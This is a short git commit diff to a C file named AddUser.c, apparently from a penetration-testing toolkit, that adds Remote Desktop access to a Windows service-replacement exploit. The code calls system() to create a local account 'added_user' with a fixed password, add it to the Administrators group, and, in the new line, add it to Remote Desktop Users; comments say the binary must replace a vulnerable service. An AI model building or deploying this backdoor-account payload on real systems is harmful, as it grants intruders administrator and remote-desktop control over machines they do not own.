1f2a685b1f4f8b96c02f6e2929dfebde7c042077
Ezra Fast <ezrafast@tutanota.com>
2024-07-10 15:32:52 -0500

    .

--- Windows/AddUser.c
+++ Windows/AddUser.c
@@ -1,5 +1,6 @@
 // x86_64-w64-mingw32-gcc adduser.c -o <service-binary-name>
 // THE COMPILED EXPLOIT MUST BE NAMED THE SAME AS THE SERVICE IT IS REPLACING!
+// This binary will add "added_user" : password and add them to the Remote Desktop Users group for remote GUI access via RDP
 #include <stdlib.h>
 
 int main() {
@@ -7,7 +8,7 @@ int main() {
 
 	i = system("net user added_user password /add");
 	i = system("net localgroup Administrators added_user /add");
+	i = system("net localgroup \"Remote Desktop Users\" added_user /add");
 
 	return 0;
 }
-
